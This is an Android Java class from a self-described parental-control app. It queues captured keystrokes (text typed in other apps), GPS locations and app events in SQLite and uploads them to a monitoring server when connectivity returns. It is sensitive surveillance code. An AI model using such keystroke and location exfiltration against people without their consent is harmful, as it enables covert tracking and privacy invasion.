package com.kidsguard.parentalcontrol.database;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;

import com.kidsguard.parentalcontrol.models.ParentalConfig;
import com.kidsguard.parentalcontrol.network.SyncClient;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Gestor de cola offline en SQLite para KidsShield.
 * Encola peticiones cuando no hay red y las despacha ordenadamente cuando vuelve la conexión.
 */
public class OfflineQueueManager {

    private static final String TAG = "KidsShield_OfflineQueue";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
    private static final AtomicBoolean isFlushing = new AtomicBoolean(false);

    public static final String TYPE_EVENT = "EVENT";
    public static final String TYPE_KEYSTROKE = "KEYSTROKE";
    public static final String TYPE_LOCATION = "LOCATION";

    /**
     * Verifica si el dispositivo cuenta con conexión a Internet activa.
     */
    public static boolean isNetworkAvailable(Context context) {
        if (context == null) return false;
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network network = cm.getActiveNetwork();
                if (network == null) return false;
                NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
                return capabilities != null && (
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                );
            } else {
                NetworkInfo netInfo = cm.getActiveNetworkInfo();
                return netInfo != null && netInfo.isConnected();
            }
        } catch (Exception e) {
            Log.w(TAG, "Error verificando conectividad: " + e.getMessage());
            return true; // Asumir disponible ante excepción para intentar despacho
        }
    }

    /**
     * Encola un evento de seguridad o intento de uso para envío diferido.
     */
    public static void enqueueEvent(
            final Context context,
            final String eventType,
            final String packageName,
            final String appName,
            final String details,
            final long timestamp
    ) {
        if (context == null) return;
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject payload = new JSONObject();
                    payload.put("type", eventType != null ? eventType : "info");
                    payload.put("eventType", eventType != null ? eventType : "info");
                    payload.put("package", packageName != null ? packageName : "");
                    payload.put("packageName", packageName != null ? packageName : "");
                    payload.put("appName", appName != null ? appName : "");
                    payload.put("message", details != null ? details : "");
                    payload.put("details", details != null ? details : "");
                    payload.put("timestamp", timestamp > 0 ? timestamp : System.currentTimeMillis());

                    insertIntoQueue(context, TYPE_EVENT, payload.toString(), timestamp);
                    Log.i(TAG, "💾 [OFFLINE] Evento guardado en SQLite local: " + eventType + " (" + appName + ")");
                } catch (Exception e) {
                    Log.e(TAG, "Error encolando evento offline", e);
                }
            }
        });
    }

    /**
     * Encola pulsaciones de teclado / texto detectado para envío diferido.
     */
    public static void enqueueKeystroke(
            final Context context,
            final String packageName,
            final String appName,
            final String text,
            final long timestamp
    ) {
        if (context == null || text == null || text.trim().isEmpty()) return;
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject payload = new JSONObject();
                    payload.put("package", packageName != null ? packageName : "");
                    payload.put("appName", appName != null ? appName : "Aplicación");
                    payload.put("text", text);
                    payload.put("timestamp", timestamp > 0 ? timestamp : System.currentTimeMillis());

                    insertIntoQueue(context, TYPE_KEYSTROKE, payload.toString(), timestamp);
                    Log.i(TAG, "💾 [OFFLINE] Texto guardado en SQLite local (" + appName + ")");
                } catch (Exception e) {
                    Log.e(TAG, "Error encolando texto offline", e);
                }
            }
        });
    }

    /**
     * Encola una ubicación GPS tomada sin conexión para histórico diferido.
     */
    public static void enqueueLocation(
            final Context context,
            final JSONObject locationObj,
            final long timestamp
    ) {
        if (context == null || locationObj == null) return;
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    long now = timestamp > 0 ? timestamp : System.currentTimeMillis();
                    if (!locationObj.has("timestamp")) {
                        locationObj.put("timestamp", now);
                    }

                    insertIntoQueue(context, TYPE_LOCATION, locationObj.toString(), now);
                    Log.i(TAG, "💾 [OFFLINE] Ubicación GPS guardada en SQLite local");
                } catch (Exception e) {
                    Log.e(TAG, "Error encolando ubicación offline", e);
                }
            }
        });
    }

    private static void insertIntoQueue(Context context, String type, String payloadStr, long createdAt) {
        OfflineDbHelper dbHelper = OfflineDbHelper.getInstance(context);
        SQLiteDatabase db = dbHelper.getWritableDatabase();

        ContentValues cv = new ContentValues();
        cv.put(OfflineDbHelper.COL_TYPE, type);
        cv.put(OfflineDbHelper.COL_PAYLOAD, payloadStr);
        cv.put(OfflineDbHelper.COL_CREATED_AT, createdAt > 0 ? createdAt : System.currentTimeMillis());
        cv.put(OfflineDbHelper.COL_RETRY_COUNT, 0);

        db.insert(OfflineDbHelper.TABLE_OFFLINE_QUEUE, null, cv);
        dbHelper.pruneOldEntries(db);
    }

    /**
     * Obtiene el número total de elementos pendientes en la cola offline.
     */
    public static int getPendingCount(Context context) {
        if (context == null) return 0;
        Cursor cursor = null;
        try {
            OfflineDbHelper dbHelper = OfflineDbHelper.getInstance(context);
            SQLiteDatabase db = dbHelper.getReadableDatabase();
            cursor = db.rawQuery("SELECT COUNT(*) FROM " + OfflineDbHelper.TABLE_OFFLINE_QUEUE, null);
            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getInt(0);
            }
        } catch (Exception e) {
            Log.w(TAG, "Error consultando tamaño de cola: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        return 0;
    }

    /**
     * Procesa la cola offline de SQLite y despacha todos los datos acumulados al servidor.
     * Solo ejecuta si hay conexión a Internet activa y no hay otro vaciado en progreso.
     */
    public static void flushQueue(final Context context) {
        if (context == null) return;
        if (!isNetworkAvailable(context)) {
            Log.d(TAG, "Intento de flush omitido: Sin conexión a Internet");
            return;
        }

        if (!isFlushing.compareAndSet(false, true)) {
            Log.d(TAG, "Vaciado de cola offline ya en ejecución");
            return;
        }

        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    int pending = getPendingCount(context);
                    if (pending == 0) {
                        return;
                    }

                    Log.i(TAG, "🚀 [ONLINE] Conexión activa detectada. Iniciando vaciado de cola SQLite (" + pending + " pendientes)...");

                    ParentalConfig config = ParentalConfig.getInstance(context);
                    String serverUrl = config.getServerUrl();
                    String deviceId = config.getDeviceId();

                    OfflineDbHelper dbHelper = OfflineDbHelper.getInstance(context);
                    SQLiteDatabase db = dbHelper.getWritableDatabase();

                    boolean keepProcessing = true;
                    int dispatchedCount = 0;

                    while (keepProcessing && isNetworkAvailable(context)) {
                        Cursor cursor = db.query(
                                OfflineDbHelper.TABLE_OFFLINE_QUEUE,
                                new String[]{OfflineDbHelper.COL_ID, OfflineDbHelper.COL_TYPE, OfflineDbHelper.COL_PAYLOAD},
                                null, null, null, null,
                                OfflineDbHelper.COL_ID + " ASC",
                                "25" // Lotes de 25
                        );

                        if (cursor == null || !cursor.moveToFirst()) {
                            if (cursor != null) cursor.close();
                            break;
                        }

                        try {
                            do {
                                long id = cursor.getLong(cursor.getColumnIndexOrThrow(OfflineDbHelper.COL_ID));
                                String type = cursor.getString(cursor.getColumnIndexOrThrow(OfflineDbHelper.COL_TYPE));
                                String payload = cursor.getString(cursor.getColumnIndexOrThrow(OfflineDbHelper.COL_PAYLOAD));

                                String endpoint = "";
                                if (TYPE_EVENT.equals(type)) {
                                    endpoint = serverUrl + "/api/devices/" + deviceId + "/event";
                                } else if (TYPE_KEYSTROKE.equals(type)) {
                                    endpoint = serverUrl + "/api/devices/" + deviceId + "/keystrokes";
                                } else if (TYPE_LOCATION.equals(type)) {
                                    endpoint = serverUrl + "/api/devices/" + deviceId + "/location";
                                }

                                if (endpoint.isEmpty()) {
                                    db.delete(OfflineDbHelper.TABLE_OFFLINE_QUEUE, OfflineDbHelper.COL_ID + " = ?", new String[]{String.valueOf(id)});
                                    continue;
                                }

                                int responseCode = sendPayloadSync(endpoint, payload);

                                if (responseCode >= 200 && responseCode < 300) {
                                    db.delete(OfflineDbHelper.TABLE_OFFLINE_QUEUE, OfflineDbHelper.COL_ID + " = ?", new String[]{String.valueOf(id)});
                                    dispatchedCount++;
                                } else if (responseCode == 404) {
                                    Log.w(TAG, "Dispositivo no encontrado en servidor (404). Deteniendo cola y liberando dispositivo...");
                                    SyncClient.handleUnlinkAndRelease(context);
                                    db.execSQL("DELETE FROM " + OfflineDbHelper.TABLE_OFFLINE_QUEUE);
                                    keepProcessing = false;
                                    break;
                                } else {
                                    Log.w(TAG, "Fallo al despachar elemento " + id + " (" + type + "), HTTP " + responseCode + ". Se reintentará.");
                                    keepProcessing = false;
                                    break;
                                }

                            } while (cursor.moveToNext());
                        } finally {
                            cursor.close();
                        }
                    }

                    if (dispatchedCount > 0) {
                        Log.i(TAG, "✅ [ONLINE] Vaciado completado con éxito: " + dispatchedCount + " registros sincronizados con el servidor.");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error durante el vaciado de cola offline", e);
                } finally {
                    isFlushing.set(false);
                }
            }
        });
    }

    private static int sendPayloadSync(String endpointUrl, String jsonPayload) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(endpointUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setRequestProperty("Accept", "application/json");
            conn.setConnectTimeout(6000);
            conn.setReadTimeout(6000);
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            return conn.getResponseCode();
        } catch (Exception e) {
            Log.w(TAG, "Error de red despachando a " + endpointUrl + ": " + e.getMessage());
            return -1;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }
}
